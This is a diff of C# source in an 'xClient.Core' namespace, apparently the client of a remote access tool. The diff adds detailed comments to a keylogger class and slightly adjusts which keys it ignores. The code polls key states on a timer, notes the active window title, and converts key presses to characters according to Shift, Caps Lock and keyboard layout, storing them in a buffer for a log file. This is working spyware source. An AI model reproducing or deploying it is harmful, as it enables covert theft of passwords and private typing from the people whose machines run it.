@@ -46,7 +46,7 @@ namespace xClient.Core
         {
             get
             {
-                return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);
+                return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); //Returns true if shiftkey is pressed
             }
         }
 
@@ -54,7 +54,7 @@ namespace xClient.Core
         {
             get
             {
-                return Control.IsKeyLocked(Keys.CapsLock);
+                return Control.IsKeyLocked(Keys.CapsLock); //Returns true if Capslock is toggled on
             }
         }
 
@@ -78,40 +78,37 @@ namespace xClient.Core
 
             WriteFile();
 
-            #region KeyEnumValues
-            enumValues = new List<int>()
+            enumValues = new List<int>() //Populate enumValues list with the Virtual Key Codes of the keys we want to log
             {
-               8,
-               9,
-               13,
-               20,
-               32,
-               46,
+               8, //Backspace
+               9, //Tab
+               13, //Enter
+               32, //Space
+               46, //Delete
             };
 
-            for (int i = 48; i <= 57; i++)
+            for (int i = 48; i <= 57; i++) //0-9 regular
             {
                 enumValues.Add(i);
             }
 
-            for (int i = 65; i <= 122; i++)
+            for (int i = 65; i <= 122; i++) //65-90 are the key codes for A-Z, skip 91-94 which are LWin + RWin keys, Applications and sleep key, 95-111 numpad keys, 112-122 are F1-F11 keys
             {
-                if (i == 91 || i == 92)
+                if (i >= 91 && i <= 94)
                     continue;
 
                 enumValues.Add(i);
             }
 
-            for (int i = 186; i <= 192; i++)
+            for (int i = 186; i <= 192; i++) //186 VK_OEM_1, 187 VK_OEM_PLUS, 188 VK_OEM_COMMA, 189 VK_OEM_MINUS, 190 VK_OEM_PERIOD, 191 VK_OEM_2, 192 VK_OEM_3
             {
                 enumValues.Add(i);
             }
 
-            for (int i = 219; i <= 222; i++)
+            for (int i = 219; i <= 222; i++) //219 VK_OEM_4, 220 VK_OEM_5, 221 VK_OEM_6, 222 VK_OEM_7
             {
                 enumValues.Add(i);
             }
-            #endregion
 
             this.timerLogKeys = new System.Timers.Timer();
             this.timerLogKeys.Enabled = false;
@@ -126,17 +123,17 @@ namespace xClient.Core
 
         private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            hWndTitle = GetActiveWindowTitle();
+            hWndTitle = GetActiveWindowTitle(); //Get active thread window title
 
-            activeKeyboardLayout = GetActiveKeyboardLayout();
+            activeKeyboardLayout = GetActiveKeyboardLayout(); //Get active thread keyboard layout
 
-            foreach (int i in enumValues)
+            foreach (int i in enumValues) //Loop through our enumValues list populated with the keys we want to log
             {
-                if (GetAsyncKeyState(i) == -32767)
+                if (GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
                 {
                     if (hWndTitle != null)
                     {
-                        if (hWndTitle != hWndLastTitle)
+                        if (hWndTitle != hWndLastTitle) //Only write title to log if a key is pressed that we support in our enumValues list, we don't want to write the title to a log with blank characters to follow
                         {
                             hWndLastTitle = hWndTitle;
 
@@ -163,24 +160,24 @@ namespace xClient.Core
                             return;
                     }
 
-                    if (enumValues.Contains(i))
+                    if (enumValues.Contains(i)) //If our enumValues list contains to current key pressed
                     {
-                        if (ShiftKey && CapsLock)
+                        if (ShiftKey && CapsLock) //If the state of Shiftkey is down and Capslock is toggled on
                         {
                             keyBuffer += FromKeys(i, true, true);
                             return;
                         }
-                        else if (ShiftKey)
+                        else if (ShiftKey) //If only the Shiftkey is pressed
                         {
                             keyBuffer += FromKeys(i, true, false);
                             return;
                         }
-                        else if (CapsLock)
+                        else if (CapsLock) //If only Capslock is toggled on
                         {
                             keyBuffer += FromKeys(i, false, true);
                             return;
                         }
-                        else
+                        else //If Capslock and Shiftkey are both not pressed/toggled on
                         {
                             keyBuffer += FromKeys(i, false, false);
                             return;
@@ -263,16 +260,16 @@ namespace xClient.Core
 
         private char? FromKeys(int keys, bool shift, bool caps)
         {
-            var keyStates = new byte[256];
-
+            var keyStates = new byte[256];  //keyStates is a byte array that specifies the current state of the keyboard and keys
+                                            //The keys we are interested in are modifier keys such as shift and caps lock
             if (shift)
-                keyStates[16] = 0x80;
+                keyStates[16] = 0x80;       //keyStates[16] tells our ToUnicodeEx method the state of the shift key which is 0x80 (Key pressed down)
             if (caps)
-                keyStates[20] = 0x01;
+                keyStates[20] = 0x01;       //keyStates[20] tells our ToUnicodeEx method the state of the Capslock key which is 0x01 (Key toggled on)
 
             var sb = new StringBuilder(10);
 
-            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, activeKeyboardLayout) == 1 ? (char?)sb[0] : null;
+            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, activeKeyboardLayout) == 1 ? (char?)sb[0] : null; //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
         }
     }
 }
